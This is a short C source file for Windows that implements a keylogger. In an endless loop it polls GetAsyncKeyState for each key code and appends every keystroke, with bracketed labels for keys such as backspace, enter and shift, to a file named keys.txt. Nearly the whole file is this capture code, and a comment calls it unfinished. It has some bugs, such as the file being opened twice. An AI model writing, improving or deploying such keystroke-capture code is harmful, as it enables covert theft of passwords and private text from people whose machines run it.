
#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <winuser.h>


// this file still needs fixing 

void startLogging();

int main(){
    startLogging();
    return 0; 
}

void startLogging(){
    FILE *keysPtr;
    keysPtr = fopen("keys.txt", "w");
    keysPtr = fopen("keys.txt", "a");
    char c;
    while(1){
        for (c = 0; c < 255; c++){
            short pressed = GetAsyncKeyState(c) & 0x1;
            if (pressed){
                const char *text;
                switch (c) {
                    case VK_BACK:
                        text = "[backspace]";
                        fprintf(keysPtr, "%s", text);
                        break;
                    case VK_RETURN:
                        text = "[enter]";
                        fprintf(keysPtr, "%s", text);
                        break;
                    case VK_SHIFT:
                        text = "[shift]";
                        fprintf(keysPtr, "%s", text);
                        break;
                    case VK_CONTROL:
                        text = "[ctrl]";
                        fprintf(keysPtr, "%s", text);
                        break;
                    case VK_CAPITAL:
                        text = "[caps]";
                        fprintf(keysPtr, "%s", text);
                        break;
                    case VK_TAB:
                        text = "[tab]";
                        fprintf(keysPtr, "%s", text);
                        break;
                    case VK_MENU:
                        text = "[alt]";
                        fprintf(keysPtr, "%s", text);
                        break;
                    case VK_LBUTTON:
                        break;
                    case VK_RBUTTON:
                        break; 
                    default:
                        char str[2];
                        str[0] = c;
                        str[1] = '\0';
                        text = str;
                        fprintf(keysPtr, "%s", text);
                }
                
            }
        }
    }
}